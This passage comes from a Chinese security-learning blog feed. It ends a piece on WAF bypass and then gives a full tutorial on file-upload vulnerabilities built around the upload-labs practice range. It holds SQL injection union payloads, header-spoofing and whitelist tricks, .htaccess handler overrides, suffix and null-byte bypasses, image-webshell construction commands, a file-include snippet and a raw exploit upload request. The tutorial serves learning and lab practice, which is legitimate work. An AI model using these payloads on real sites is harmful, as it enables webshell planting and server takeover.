0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9</p><p>PS：0xA*1000指0xA后面”A”重复1000次，一般来说对应用软件构成缓冲区溢出都需要较大的测试长度，这里1000只做参考也许在有些情况下可能不需要这么长也能溢出。</p><p>例子2：</p><p>?a0&#x3D;0&amp;a1&#x3D;1&amp;…..&amp;a100&#x3D;100&amp;id&#x3D;1 union select 1,schema_name,3 from INFORMATION_SCHEMA.schemata</p><p>备注：获取请求参数，只获取前100个参数，第101个参数并没有获取到，导致SQL注入绕过。</p><h4 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h4><p><strong>方式一：IP白名单</strong></p><p>从网络层获取的ip，这种一般伪造不来，如果是获取客户端的IP，这样就可能存在伪造IP绕过的情况。</p><p>测试方法：修改http的header来bypass waf</p><p>X-forwarded-for</p><p>X-remote-IP</p><p>X-originating-IP</p><p>x-remote-addr</p><p>X-Real-ip</p><p><strong>方式二：静态资源</strong></p><p>特定的静态资源后缀请求，常见的静态文件(.js .jpg .swf .css等等)，类似白名单机制，waf为了检测效率，不去检测这样一些静态文件名后缀的请求。</p><p><a href="http://10.9.9.201/sql.php?id=1">http://10.9.9.201/sql.php?id=1</a></p><p><a href="http://10.9.9.201/sql.php/1.js?id=1">http://10.9.9.201/sql.php/1.js?id=1</a></p><p>备注：Aspx&#x2F;php只识别到前面的.aspx&#x2F;.php 后面基本不识别</p><p><strong>方式三：url白名单</strong></p><p>为了防止误拦，部分waf内置默认的白名单列表，如</p><p>admin&#x2F;manager&#x2F;system等管理后台。</p><p>只要url中存在白名单的字符串，就作为白名单不进行检测。</p><p><strong>常见的url构造：</strong></p><p><code>http://10.9.9.201/sql.php/admin.php?id=1</code></p><p><code>http://10.9.9.201/sql.php?a=/manage/&amp;b=../etc/passwd</code></p><p><code>http://10.9.9.201/../../../manage/../sql.asp?id=2</code></p><p>waf通过&#x2F;manage&#x2F;“进行比较，只要uri中存在&#x2F;manage&#x2F;就作为白名单不进行检测，这样我们可以通过&#x2F;sql.php?a&#x3D;&#x2F;manage&#x2F;&amp;b&#x3D;..&#x2F;etc&#x2F;passwd 绕过防御规则。</p><p><strong>方式四：爬虫白名单</strong></p><p>部分waf有提供爬虫白名单的功能，识别爬虫的技术一般有两种：</p><p>1、 根据UserAgent  2、通过行为来判断</p><p>UserAgent可以很容易欺骗，我们可以伪装成爬虫尝试绕过。</p><p>User Agent Switcher (Firefox 附加组件)，下载地址：<a href="https://addons.mozilla.org/en-US/firefox/addon/user-agent-switcher/">https://addons.mozilla.org/en-US/firefox/addon/user-agent-switcher/</a></p><h3 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h3><h3 id="整合绕过"><a href="#整合绕过" class="headerlink" title="整合绕过"></a>整合绕过</h3>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;WAF简介&quot;&gt;&lt;a href=&quot;#WAF简介&quot; class=&quot;headerlink&quot; title=&quot;WAF简介&quot;&gt;&lt;/a&gt;WAF简介&lt;/h2&gt;&lt;h3 id=&quot;功能&quot;&gt;&lt;a href=&quot;#功能&quot; class=&quot;headerlink&quot; title=&quot;功能&quot;&gt;&lt;/a&gt;功</summary>
      
    
    
    
    
    <category term="渗透测试" scheme="https://frankcao3.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>文件上传</title>
    <link href="https://frankcao3.github.io/posts/11796"/>
    <id>https://frankcao3.github.io/posts/11796</id>
    <published>2022-08-04T16:00:00.000Z</published>
    <updated>2023-10-06T09:09:05.976Z</updated>
    
    <content type="html"><![CDATA[<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/1627433334141-cb693e43-53e8-4e28-80b9-b2c08e23f2f6.png" alt="web漏洞文件上传.png"></p><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>文件上传漏洞是指用户上传了一个<strong>可执行的脚本文件webshell</strong>，而且通过这个脚本文件获得了执行服务器端命令的能力。</p><p>Webshell 以 ASP、PHP、JSP 等网页文件形式存在的一种命令执行环境，也称其为一种网页后门，通过 Webshell 可以对所在服务器进行远程管理。</p><h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><p>非法用户可以利用上传的恶意脚本文件WebShell控制整个网站，甚至控制服务器。也可将WebShel脚本称为一 种网页后门，WebShel脚本具有非常强大的功能，比如查看服务器目录、服务器中的文件，执行系统命令等。</p><ul><li>网站被植入黑链（博彩、黄色）</li><li>挖矿</li><li>文件泄露</li></ul><h2 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h2><p>前端或者服务端代码未对客户端上传的文件进行严格的验证和过滤。</p><p>文件上传漏洞发生的<strong>前提</strong></p><p>1、网站上传功能能正常使用<br>2、文件类型允许上传<br>3、上传路径可以确定<br>4、文件可以被访问，可以被执行或被包含</p><h2 id="查找和判断"><a href="#查找和判断" class="headerlink" title="查找和判断"></a>查找和判断</h2><p>黑盒查找：不知道源代码情况下，通过目录扫描和网站应用，以及通过网站后台、会员中心进行获取权限，需要自己判断。</p><p>白盒查找：通过源代码分析文件上传漏洞。</p><p>判断：通过抓包分析</p><h2 id="文件上传的分类"><a href="#文件上传的分类" class="headerlink" title="文件上传的分类"></a>文件上传的分类</h2><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/1627433817849-28573285-fa9c-4d1d-9864-2f822f372ee5.png" alt="文件上传利用思路.png"></p><ul><li><p>常规类</p></li><li><p>CMS类</p><p>CMS 又叫网站内容管理系统（网站的模版，帮助我们快速建站，我们会在这个网站模板上做二次开发），市面上很多开源的CMS 的历史版本有很多都存在着文件上传漏洞，但是产生文件上传漏洞的原因不尽相同。</p><p>比如常见的dedeCMS（织梦）、PHPcms、Seacms 等。</p><p>参考：<a href="https://blog.csdn.net/qq_35733751/article/details/115317967">https://blog.csdn.net/qq_35733751/article/details/115317967</a></p></li><li><p>编辑器类</p><p>编辑器就是网站后台编辑网页的在线编辑器，会自动集成文件上传功能，这些编辑器的某些版本也存在文件上传漏洞，从而进行getshell</p><p>比如ewebeditor、fckeditor。</p><p>参考：<a href="https://www.likecs.com/show-203442332.html">https://www.likecs.com/show-203442332.html</a></p></li><li><p>CVE</p><p>比如，Weblogic任意文件上传漏洞( CVE-2018-2894 )</p></li></ul><h2 id="文件上传的利用"><a href="#文件上传的利用" class="headerlink" title="文件上传的利用"></a>文件上传的利用</h2><ul><li><p><strong>找到上传的位置</strong></p><p>常规文件上传地址的获取说明：</p><p>比如搜索引擎搜索<code>inurl:upload.php</code>、网站的目录扫描（<strong>御剑</strong>）、针对网站搜索upload关键词<code>site:abc.com upload</code>、网站自身的应用（上传头像、图片等）。</p></li><li><p><strong>尝试绕过校验，上传php文件</strong></p><p>upload-fuzz-dic-builder 上传漏洞fuzz字典生成脚本：<a href="https://github.com/c0ny1/upload-fuzz-dic-builder">https://github.com/c0ny1/upload-fuzz-dic-builder</a></p><p>文件上传攻击一般配合文件解析漏洞，比如nginx解析漏洞。具体可以看文件上传攻击的防护及绕过。</p></li><li><p><strong>获得文件位置</strong></p><p>上传文件后，要想执行，必须先获取文件路径。可以拖动上传的文件到新标签页得到文件路径，或者看看URL、或者看网站有没有查看所上传文件的地方。</p></li><li><p><strong>蚁剑&#x2F;菜刀连接，管理文件</strong></p></li></ul><h2 id="文件上传攻击的防护及绕过"><a href="#文件上传攻击的防护及绕过" class="headerlink" title="文件上传攻击的防护及绕过"></a>文件上传攻击的防护及绕过</h2><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/1627433334141-cb693e43-53e8-4e28-80b9-b2c08e23f2f6.png" alt="img"></p><p>**使用github上的靶场：<code>upload labs</code>**（场景比DVMA更丰富），下载下来放在本地网站localhost里（phpstudy或者apache+php）。</p><p>fuzz字典：<a href="https://github.com/c0ny1/upload-fuzz-dic-builder%EF%BC%8C%E5%8C%85%E5%90%AB%E5%8F%AF%E8%83%BD%E7%9A%84%E6%94%BB%E5%87%BB%E8%AF%AD%E5%8F%A5%E3%80%82%E7%BB%93%E5%90%88BP%E4%BD%BF%E7%94%A8%E3%80%82">https://github.com/c0ny1/upload-fuzz-dic-builder，包含可能的攻击语句。结合BP使用。</a></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220728153545912.png" alt="image-20220728153545912"></p><h3 id="防护思路"><a href="#防护思路" class="headerlink" title="防护思路"></a>防护思路</h3><ol><li><p>后端验证：采用服务端验证模式（不采用前端验证） </p></li><li><p>下面三种检测方式同时进行：</p><ul><li><p>后缀检测：基于黑名单，白名单过滤</p></li><li><p>MIME 检测：基于上传自带类型检测</p></li><li><p>内容检测：文件头，完整性检测</p></li></ul></li><li><p>自带函数过滤（就PHP脚本而言） </p><p>比如getimagesize()函数检查文件头；exif_imagetype()函数检查文件类型等等</p></li><li><p>自定义函数过滤：function check_file(){}</p><p>结合黑名单和白名单，可以两者相互嵌套</p></li><li><p>WAF 防护产品：宝塔，云盾，安全公司产品等</p><p>如果存在waf,就无法判断是否存在文件上传漏洞，只有一一尝试。</p></li></ol><h3 id="1-前端限制文件类型（白名单）"><a href="#1-前端限制文件类型（白名单）" class="headerlink" title="1. 前端限制文件类型（白名单）"></a>1. 前端限制文件类型（白名单）</h3><p>破解方法一：直接F12，删除（禁用）前端的限制文件类型的JS脚本。上传成功后，拖动图片到新标签页得到文件路径。</p><p>破解方法二：先上传网站允许的文件后缀，然后BP抓包修改文件后缀为php。</p><h3 id="2-MIME类型"><a href="#2-MIME类型" class="headerlink" title="2. MIME类型"></a>2. MIME类型</h3><p>参考upload-labs Pass-2。</p><p>在访问网页时，MIME type帮助浏览器识别一个HTTP请求返回的是什么内容的数据，应该如何打开、如何显示。<strong>作用和文件拓展名相似，但不同的是它并非标注文件，而是在邮件和HTTP协议中用来标注网络数据的。</strong></p><p>客户端使用:</p><p>1、GET请求不需要这个字段。<br>2、POST请求头，放在<strong>Content Type字段</strong> 用来指定上传的文件类型，方便服务器解析。放在Accept, 告诉服务端允许接收的响应类型。比如只能接收json或者其他。</p><p>服务端使用:</p><p>1、放在响应头里面，<strong>Content Type</strong> 告诉客户端响应的数据类型，方便客户端解析。</p><table><thead><tr><th>MIME</th><th>描述</th></tr></thead><tbody><tr><td>text&#x2F;html</td><td>HTML格式</td></tr><tr><td>application&#x2F;json</td><td>JSON数据格式</td></tr><tr><td>multipart&#x2F;form-data</td><td>文件上传(二进制数据)</td></tr><tr><td>image&#x2F;jpeg、image&#x2F;gif、image&#x2F;pjpeg</td><td>jpg、gif、pjpeg图片格式</td></tr></tbody></table><p>MIME类型的确定根据的是文件扩展名。</p><p>破解方法：BP抓包，修改MIME类型为image&#x2F;jpeg即可绕过上传。</p><h3 id="3-文件后缀黑名单"><a href="#3-文件后缀黑名单" class="headerlink" title="3. 文件后缀黑名单"></a>3. 文件后缀黑名单</h3><p>参考upload-labs Pass-4。</p><p>禁止asp、php等类型文件上传。</p><p>破解方法：使用等价扩展名。</p><table><thead><tr><th>语言</th><th>等价扩展名</th></tr></thead><tbody><tr><td>asp</td><td>asa,cer,cdx</td></tr><tr><td>aspx</td><td>ashx,asmx,ascx</td></tr><tr><td>php</td><td>php2、 php3、 php4、 php5、 phps、 phtml</td></tr><tr><td>jsp</td><td>jspx.jspf</td></tr></tbody></table><p><strong>文件后缀绕过</strong></p><p>文件后缀绕过攻击是服务端代码中限制了某些后缀的文件不允许上传，但是有些Apache是允许解析其他文件后缀的，例如在httpd.conf中，如果<strong>增加其他后缀</strong>为<code>shell.php.phtml</code>，则能够解析php和phtml文件。</p><p>在Apache的<strong>解析顺序</strong>中，是从右到左开始解析文件后缀的，如果最右侧的扩展名不可识别，就继续往左判断，直到遇到可以解析的文件后缀为止，所以如果上传的文件名类似<code>1.php.xxxx</code>，因为后缀xxxx不可以解析，所以向左解析后缀php。而服务器如果使用php的pathinfo()来获取文件后缀，那么只会看到后缀xxxx，因此实现了绕过。</p><h3 id="4-很全的黑名单-大小写模糊（-htaccess绕过）"><a href="#4-很全的黑名单-大小写模糊（-htaccess绕过）" class="headerlink" title="4. 很全的黑名单+大小写模糊（.htaccess绕过）"></a>4. 很全的黑名单+大小写模糊（.htaccess绕过）</h3><p>黑名单更多了一些，不过没有过滤<code>.htaccess</code>后缀，参考upload-labs Pass-4。</p><p>先按照如下代码块的内容写一个新的<code>.htaccess</code>文件，然后上传，使其处于所有上传文件所在的目录。</p><blockquote><p>htaccess: Hypertext Access(超文本入口)<br>它是一个纯文本文件，它里面存放着Apache服务器配置相关的指令。<br>作用：伪静态、图片防盗链、自定义404错误页面、阻止&#x2F;允许特定IP&#x2F;IP段、目录浏览与主页、禁止访问指定文件类型、文件密码保护</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;test.png&quot;&gt;  </span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line">AddType application/x-httpd-php png</span><br></pre></td></tr></table></figure><p>然后将php文件修改为<code>.htaccess</code>文件所指定的图片文件后缀或文件名，然后上传。因为.htaccess文件被修改，所以直接访问该图片文件时其会被服务器当作PHP文件解析。</p><p><strong>.htaccess生效的前提：</strong></p><p>httpd.conf设置AllowOverride all，而不是none，所以phpstudy集成的apache会无法实验成功。</p><h3 id="5-黑名单过滤，没有考虑大小写"><a href="#5-黑名单过滤，没有考虑大小写" class="headerlink" title="5. 黑名单过滤，没有考虑大小写"></a>5. <strong>黑名单过滤，没有考虑大小写</strong></h3><p>过滤htaccess后缀，但是没有过滤php全部的大小写，使用后缀pHp即可绕过上传。参考upload-labs Pass-5。</p><p><code>shell.pHp</code></p><h3 id="6-黑名单过滤，没有对后缀去空"><a href="#6-黑名单过滤，没有对后缀去空" class="headerlink" title="6. 黑名单过滤，没有对后缀去空"></a>6. 黑名单过滤，没有对后缀去空</h3><p>在判断后缀名的时候没有先去除多余的空格。参考upload-labs Pass-6。</p><p>后缀名后添加空格即可绕过后端php脚本的检测，再上传到windows服务器上，会自动去除后缀名后的空格。</p><p><code>shell.php </code>（php后面有空格）</p><h3 id="7-黑名单过滤，没有过滤点"><a href="#7-黑名单过滤，没有过滤点" class="headerlink" title="7. 黑名单过滤，没有过滤点"></a>7. 黑名单过滤，没有过滤点</h3><p>添加点即可绕过后端的php检测，而且可以正常解析。参考upload-labs Pass-7。</p><p><code>shell.php.</code></p><p>另外，遇到move_uploaded_file()函数时，其有这么一个特性，会忽略掉文件末尾的 &#x2F;.<br>所以直接上传php文件，然后抓包，添加&#x2F;. 就可以绕过黑名单。参考upload-labs Pass-19。</p><p><code>shell.php/.</code></p><p><strong>【upload-labs Pass-20】</strong>：</p><p>查看该题源码可知，若提交的保存的文件名save_name不是数组，那就以点来分割得到数组$file。而下面的EXP则是直接提交数组。</p><p>该页面会将数组的最后一个元素看作后缀名进行白名单校验，通过校验后将第一个元素和点以及最后一个元素拼接得到文件名。但是在取最后一个元素时存在漏洞：<code>$file_name = reset($file) . &#39;.&#39; . $file[count($file) - 1];</code>。可以看如下POST请求体，save_name[0]为shell.php&#x2F;，save_name[2]为jpg，这样校验后缀名时取的是index为2的jpg。但是在拼接文件名时，由于未给save_name[1]赋值，所以<code>count($file)</code>的结果是2而非3，所以<code>$file[count($file) - 1]</code>的值为空，而非jpg。最后得到的文件名就为<code>shell.php/.</code>，又由于move_uploaded_file()函数会忽略这个&#x2F;.，所以该文件会被保存为shell.php。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundary0lAKZaGSiktCjkBi</span><br><span class="line">Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;shell.php&quot;</span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">phpinfo();</span><br><span class="line">?&gt;</span><br><span class="line">------WebKitFormBoundary0lAKZaGSiktCjkBi</span><br><span class="line">Content-Disposition: form-data; name=&quot;save_name[0]&quot;</span><br><span class="line"></span><br><span class="line">shell.php/</span><br><span class="line">------WebKitFormBoundary0lAKZaGSiktCjkBi</span><br><span class="line">Content-Disposition: form-data; name=&quot;save_name[2]&quot;</span><br><span class="line"></span><br><span class="line">jpg</span><br><span class="line">------WebKitFormBoundary0lAKZaGSiktCjkBi</span><br><span class="line">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">上传</span><br><span class="line">------WebKitFormBoundary0lAKZaGSiktCjkBi--</span><br></pre></td></tr></table></figure><h3 id="8-黑名单过滤，没有过滤-DATA"><a href="#8-黑名单过滤，没有过滤-DATA" class="headerlink" title="8. 黑名单过滤，没有过滤::$DATA"></a>8. 黑名单过滤，没有过滤::$DATA</h3><p>参考upload-labs Pass-8。</p><blockquote><p>在 Windows 操作系统中，::$DATA 是一种用于隐藏文件的特殊附加数据流（Alternate Data Stream）。它是一种扩展文件属性，可以将额外的数据附加到一个文件中，而不会影响文件的主要内容。<br>附加数据流基于文件名和冒号之间的特殊语法，例如：file.txt::D A T A 。附加数据流可以储存任意类型的数据，例如文本、二进制文件或其他文件。这使得 : : DATA。附加数据流可以储存任意类型的数据，例如文本、二进制文件或其他文件。 这使得 ::DATA。附加数据流可以储存任意类型的数据，例如文本、二进制文件或其他文件。这使得::DATA 可以被用于隐藏文件内容、存储元数据或其他需要与主文件相关但不希望直接显示给用户的信息。</p></blockquote><p><code>shell.php::$DATA</code></p><h3 id="9-黑名单过滤，改变符号或者多次换行"><a href="#9-黑名单过滤，改变符号或者多次换行" class="headerlink" title="9. 黑名单过滤，改变符号或者多次换行"></a>9. 黑名单过滤，改变符号或者多次换行</h3><p>比如BP抓包后，将双引号变为单引号，或者去掉文件名的双引号：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data;name=&quot;uploadfile&quot;; filename=info4.php</span><br><span class="line">Content-Type: image/jpeg</span><br></pre></td></tr></table></figure><p>或者只用一个双引号（引号没有闭合，安全狗会误以为是程序自带）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data;name=&quot;uploadfile&quot;; filename=&quot;info5.php</span><br><span class="line">Content-Type: image/jpeg</span><br></pre></td></tr></table></figure><p>或者文件名内多次换行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;x.</span><br><span class="line">p</span><br><span class="line">h</span><br><span class="line">p&quot;</span><br><span class="line">Content-Type:  image/jpeg</span><br></pre></td></tr></table></figure><h3 id="10-黑名单，；绕过"><a href="#10-黑名单，；绕过" class="headerlink" title="10. 黑名单，；绕过"></a>10. 黑名单，<code>；</code>绕过</h3><p><code>.jpg;.php</code></p><p>分号<code>;</code>代表语句的结束，安全狗检测文件名字符串时，检测到jpg就结束了，后面的.php略过。</p><h3 id="11-删除黑名单字段（-x3D-x3D-重复数据-x3D-x3D-绕过）"><a href="#11-删除黑名单字段（-x3D-x3D-重复数据-x3D-x3D-绕过）" class="headerlink" title="11. 删除黑名单字段（&#x3D;&#x3D;重复数据&#x3D;&#x3D;绕过）"></a>11. 删除黑名单字段（&#x3D;&#x3D;重复数据&#x3D;&#x3D;绕过）</h3><p>黑名单包括php、asp</p><p>破解：文件名双写：比如<code>shell.pphphp</code></p><h3 id="12-白名单（get的-00-x3D-x3D-截断绕过-x3D-x3D-）"><a href="#12-白名单（get的-00-x3D-x3D-截断绕过-x3D-x3D-）" class="headerlink" title="12. 白名单（get的%00&#x3D;&#x3D;截断绕过&#x3D;&#x3D;）"></a>12. 白名单（get的%00&#x3D;&#x3D;截断绕过&#x3D;&#x3D;）</h3><p>参考upload-labs Pass-11。</p><p>严格限制后缀为某几种，但是请求路径使用的是get请求（request请求）。</p><p>get请求会根据文件路径做了一个00截断，<code>../upload/1.php%00check.jpg</code>不会被白名单过滤，而且请求后路径就被截断，变成<code>../upload/1.php</code> 。</p><blockquote><p>00截断的操作环境<strong>需魔术引用开关magic_quotes_gpc为off状态</strong>，不然%00会被转义，导致攻击失效。</p><p>魔术引用开关magic_quotes_gpc会转义以下字符：</p><p>单引号（’）<br>双引号（”）<br>反斜杠（\）<br>NULL</p></blockquote><p>但是，该方法只能绕过接收参数时的判断，如果服务器对请求后得到的路径再进行白名单的判断，因为已经被get请求截断了，后缀变成php，还是会被检测到。</p><h3 id="13-白名单（post的-00截断绕过）"><a href="#13-白名单（post的-00截断绕过）" class="headerlink" title="13. 白名单（post的%00截断绕过）"></a>13. 白名单（post的%00截断绕过）</h3><p>参考upload-labs Pass-12。</p><p>严格限制后缀为某几种，但是请求路径使用的是post请求（request请求）。</p><p>post需要通过BP抓包修改数据包的文件名后缀部分，需要用二进制的方式去修改。</p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/20190617182023127.png" alt="img" style="zoom:50%;"><h3 id="14-x3D-x3D-判断文件头-x3D-x3D-图片马"><a href="#14-x3D-x3D-判断文件头-x3D-x3D-图片马" class="headerlink" title="14. &#x3D;&#x3D;判断文件头&#x3D;&#x3D;(图片马)"></a>14. &#x3D;&#x3D;判断文件头&#x3D;&#x3D;(图片马)</h3><p>参考upload-labs Pass-14-17。</p><p>使用了 <code>getimagesize( $uploaded_tmp )</code> 来获取<strong>文件头</strong>中的图片尺寸信息，读取不到尺寸信息则拒绝上传。</p><p>此时可以使用图片马，文件后缀依然为php。此时webshell可以被解析为脚本，同时getimagesize也可以获取到图片信息。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat huaji.jpg shell.php &gt; shell.php</span><br></pre></td></tr></table></figure><h3 id="15-判断文件头且限制后缀"><a href="#15-判断文件头且限制后缀" class="headerlink" title="15. 判断文件头且限制后缀"></a>15. 判断文件头且限制后缀</h3><p>使用 <code>strrpos( $uploaded_name, &#39;.&#39; )</code> 函数来截取文件名中最后一个 <code>.</code> 后面的字符，来识别为上传的文件的后缀名，并只接受后缀名为 <code>jpg</code>，<code>jpeg</code>，<code>png</code> 的文件。同时使用了 <code>getimagesize( $uploaded_tmp )</code> 来获取<strong>文件头</strong>中的图片尺寸信息，读取不到尺寸信息则拒绝上传。</p><p>此时只能使用图片马：</p><p>windows</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">copy</span> huaji.gif /b + shell.php /a shell.gif</span><br></pre></td></tr></table></figure><p>Linux</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat huaji.jpg shell.php &gt; shell.jpg</span><br></pre></td></tr></table></figure><p>图片马需要通过命令注入漏洞<code>rename shell.jpg shell.php</code>来把上一步上传的 <code>shell.jpg</code> 重命名为 <code>shell.php</code>，然后利用文件包含漏洞才能执行，使用include包含。</p><p><code>include</code> 方法可以让当前页面去执行指定的另外一个文件中的代码内容。</p><p>存在如下文件：upload&#x2F;include.php，文件内容如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>] ;</span><br><span class="line"><span class="keyword">include</span> (<span class="variable">$file</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>使用<code>localhost:8080/upload/include.php?page=shell.php</code>可以借助蚁剑连接成功。</p><h3 id="16-php内置函数获取图片类型"><a href="#16-php内置函数获取图片类型" class="headerlink" title="16. php内置函数获取图片类型"></a>16. php内置函数获取图片类型</h3><p>比如getimagesize()、exif_imagetype()。</p><p><strong>exif_imagetype()</strong> 读取一个图像的第一个字节并检查其签名。</p><p>exif_imagetype环境需要开启php_exit模块。如果函数出现报错，则需要去php.ini修改如下内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">extension=php_mbstring.dll</span><br><span class="line">extension=php_exif.dll</span><br></pre></td></tr></table></figure><p>然后再重启服务器即可。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>); <span class="comment">//设置编码为UTF-8 不然乱码</span></span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]; <span class="comment">//通过get传值判断文件类型</span></span><br><span class="line"><span class="variable">$image_type</span> = <span class="title function_ invoke__">exif_imagetype</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;进行判断&quot;</span>;</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$image_type</span>)&#123;</span><br><span class="line">    <span class="keyword">case</span> IMAGETYPE_GIF:</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$filename</span>.<span class="string">&quot;文件类型:GIF&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> IMAGETYPE_JPEG:</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$filename</span>.<span class="string">&quot;文件类型:jpg&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> IMAGETYPE_PNG:</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$filename</span>.<span class="string">&quot;文件类型:png&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$filename</span>.<span class="string">&quot;文件类型:未知&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上图片马绕过。</p><h3 id="17-上传后重命名（md5）"><a href="#17-上传后重命名（md5）" class="headerlink" title="17.  上传后重命名（md5）"></a>17.  上传后重命名（md5）</h3><p>使用了 <code>md5()</code> 函数对上传的文件的文件名进行重命名，重命名为 MD5 散列运算之后的值。可以防御通过 00 截断来解析一句话木马。同时使用了随机 Token 检查来增加修改数据包上传的难度。</p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/15622995660349.jpg" alt="img" style="zoom: 33%;"><h3 id="18-竞争条件攻击"><a href="#18-竞争条件攻击" class="headerlink" title="18. 竞争条件攻击"></a>18. 竞争条件攻击</h3><p>参考upload-labs Pass-18。</p><p>一些网站上传文件的逻辑是先允许上传任意文件，然后检查上传的文件是否包含WebShel脚本，如果包含则删除该文件。这里存在的问题是文件上传成功后和删除文件之间存在一个短的时间差(因为要执行检查文件和删除文件的操作) , 攻击者就可以利用这个时间差完成竞争条件的上传漏洞攻击。</p><h3 id="19-x3D-x3D-数据溢出-x3D-x3D"><a href="#19-x3D-x3D-数据溢出-x3D-x3D" class="headerlink" title="19. &#x3D;&#x3D;数据溢出&#x3D;&#x3D;"></a>19. &#x3D;&#x3D;数据溢出&#x3D;&#x3D;</h3><p>php文件被安全狗拦截：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/1627898889066-ba927953-805b-446e-a0c8-28a8e437dcec.png" alt="image.png"></p><p>修改数据包上传<code>Content-Disposition: form-data; name=&quot;uploadfile&quot;;</code>中间插入大量的垃圾数据从而绕过。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/1627898527403-03b55f1a-41a2-497a-a53b-61c5259b6895.png" alt="image.png"></p><h3 id="20-站库分离"><a href="#20-站库分离" class="headerlink" title="20. 站库分离"></a>20. 站库分离</h3><p>文件和网站放在不同的服务器上，即单独设置文件服务器的域名。这样就无法通过上传的文件对网站服务器进行渗透。</p><h1 